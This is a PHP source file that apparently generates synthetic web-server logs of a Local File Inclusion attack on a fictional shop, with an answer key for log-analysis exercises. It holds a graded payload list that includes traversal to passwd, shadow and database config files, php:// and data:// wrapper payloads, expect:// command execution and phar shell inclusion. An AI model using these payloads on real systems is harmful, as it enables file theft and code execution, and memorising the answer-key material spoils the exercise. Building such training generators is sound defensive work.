<?php
/**
 * Pulse Generator — LFI Attack Scenario
 * Generates Local File Inclusion attack patterns against page.php?file=
 */

require_once __DIR__ . '/config.php';

/**
 * LFI payload definitions
 * Each entry: [payload_path, expected_status, description]
 */
function getLfiPayloads($difficulty = 'medium') {
    $basic = [
        // Basic directory traversal
        ['../../../etc/passwd', 200],
        ['....//....//....//etc/passwd', 200],
        ['..%2f..%2f..%2fetc%2fpasswd', 200],
        ['..\\..\\..\\etc\\passwd', 200],
        ['../../../../etc/passwd', 200],
        ['../../../../../etc/passwd', 200],
        ['../../../../../../etc/shadow', 403],
        ['../../../etc/hosts', 200],
        ['../../../etc/hostname', 200],
        ['../../../etc/issue', 200],
        ['../../../proc/self/environ', 200],
        ['../../../proc/version', 200],
        ['../../../proc/self/cmdline', 200],
        // Windows paths (XAMPP)
        ['..\\..\\..\\xampp\\apache\\conf\\httpd.conf', 200],
        ['..\\..\\..\\xampp\\apache\\logs\\access.log', 200],
        ['..\\..\\..\\xampp\\apache\\logs\\error.log', 200],
        ['..\\..\\..\\xampp\\phpMyAdmin\\config.inc.php', 200],
        ['..\\..\\..\\xampp\\mysql\\data\\mysql\\user.MYD', 200],
        ['../../../xampp/htdocs/brightmall/includes/db.php', 200],
        ['C:\\xampp\\apache\\conf\\httpd.conf', 200],
        ['C:/xampp/apache/conf/httpd.conf', 200],
    ];

    $intermediate = [
        // Null byte injection (legacy PHP)
        ['../../../etc/passwd%00', 200],
        ['../../../etc/passwd%00.php', 200],
        ['....//....//....//etc/passwd%00', 200],
        // PHP wrappers
        ['php://filter/convert.base64-encode/resource=index', 200],
        ['php://filter/convert.base64-encode/resource=products', 200],
        ['php://filter/convert.base64-encode/resource=../includes/db', 200],
        ['php://filter/convert.base64-encode/resource=../config', 200],
        ['php://filter/read=string.rot13/resource=index', 200],
        ['php://input', 200],
        ['data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', 200],
        // Double encoding
        ['..%252f..%252f..%252fetc%252fpasswd', 200],
        ['%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', 200],
        // Path truncation
        ['../../../etc/passwd' . str_repeat('/.', 50), 200],
    ];

    $advanced = [
        // Log poisoning (attacker checks log path first, then poisons)
        ['../../../xampp/apache/logs/access.log', 200],
        ['../../../xampp/apache/logs/error.log', 200],
        ['../../../var/log/apache2/access.log', 404],
        ['../../../var/log/apache2/error.log', 404],
        // Proc filesystem
        ['../../../proc/self/fd/0', 200],
        ['../../../proc/self/fd/1', 200],
        ['../../../proc/self/fd/2', 200],
        ['../../../proc/self/status', 200],
        ['../../../proc/self/mounts', 200],
        ['../../../proc/net/tcp', 200],
        // Expect wrapper
        ['expect://id', 200],
        ['expect://whoami', 200],
        // PHP filter chains
        ['php://filter/convert.iconv.UTF-8.UTF-7/resource=index', 200],
        ['php://filter/zlib.deflate/convert.base64-encode/resource=index', 200],
        // Zip wrapper
        ['zip://uploads/avatar.jpg%23shell', 200],
        ['phar://uploads/avatar.jpg/shell.php', 200],
    ];

    switch ($difficulty) {
        case 'easy':
            return $basic;
        case 'medium':
            return array_merge($basic, $intermediate);
        case 'hard':
            return array_merge($basic, $intermediate, $advanced);
        default:
            return array_merge($basic, $intermediate);
    }
}

/**
 * Generate LFI attack log lines
 * 
 * @param int $attackerCount Number of attacker IPs
 * @param string $difficulty easy|medium|hard
 * @param DateTime $startTime
 * @param DateTime $endTime
 * @return array ['lines' => [...], 'answers' => [...]]
 */
function generateLfi($attackerCount, $difficulty, $startTime, $endTime) {
    $lines = [];
    $answers = [
        'type' => 'LFI (Local File Inclusion)',
        'vector' => '/page.php?file=',
        'attacker_ips' => [],
        'targeted_files' => [],
    ];

    $attackerIps = pickN(ATTACKER_IP_POOL, $attackerCount);
    $payloads = getLfiPayloads($difficulty);
    $startTs = $startTime->getTimestamp();
    $endTs = $endTime->getTimestamp();

    $answers['attacker_ips'] = $attackerIps;

    foreach ($attackerIps as $ip) {
        $ua = pick(ATTACKER_USER_AGENTS);

        // Attacker starts with some recon (normal browsing)
        $reconTime = mt_rand($startTs, intval($startTs + ($endTs - $startTs) * 0.3));
        $reconPaths = [
            ['GET', '/', 200],
            ['GET', '/products.php', 200],
            ['GET', '/page.php?file=about', 200],
            ['GET', '/page.php?file=contact', 200],
            ['GET', '/robots.txt', 200],
        ];

        foreach ($reconPaths as $rp) {
            $ts = new DateTime();
            $ts->setTimestamp($reconTime);
            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatLogLine(
                    $ip, $ts, $rp[0], $rp[1], 'HTTP/1.1',
                    $rp[2], randBetween(512, 4096), '-', $ua
                ),
            ];
            $reconTime += mt_rand(2, 15);
        }

        // Now launch LFI payloads
        $attackStart = $reconTime + mt_rand(30, 120);
        $currentTs = $attackStart;

        // Shuffle payloads for realism
        $selectedPayloads = $payloads;
        shuffle($selectedPayloads);

        // Use a subset based on difficulty
        $payloadCount = match($difficulty) {
            'easy' => mt_rand(8, 15),
            'medium' => mt_rand(15, 30),
            'hard' => mt_rand(25, count($selectedPayloads)),
            default => mt_rand(15, 30),
        };
        $selectedPayloads = array_slice($selectedPayloads, 0, $payloadCount);

        foreach ($selectedPayloads as $payload) {
            $path = '/page.php?file=' . $payload[0];
            $status = $payload[1];

            // Track unique targeted files for answer key
            $targetedFile = urldecode($payload[0]);
            // Clean up for answer key
            $targetedFile = str_replace(['%00', '%252f', '%2f'], ['', '/', '/'], $targetedFile);
            if (!in_array($targetedFile, $answers['targeted_files'])) {
                $answers['targeted_files'][] = $targetedFile;
            }

            $size = ($status === 200) ? randBetween(128, 4096) : randBetween(256, 512);
            $referer = (mt_rand(1, 3) === 1) ? 'https://brightmall.local/page.php?file=about' : '-';

            $ts = new DateTime();
            $ts->setTimestamp($currentTs);

            $lines[] = [
                'timestamp' => clone $ts,
                'line' => formatLogLine(
                    $ip, $ts, 'GET', $path, 'HTTP/1.1',
                    $status, $size, $referer, $ua
                ),
            ];

            // Attacker delays between attempts (1-8 seconds, sometimes faster bursts)
            $currentTs += (mt_rand(1, 10) <= 3) ? mt_rand(1, 2) : mt_rand(3, 8);
        }
    }

    return ['lines' => $lines, 'answers' => $answers];
}
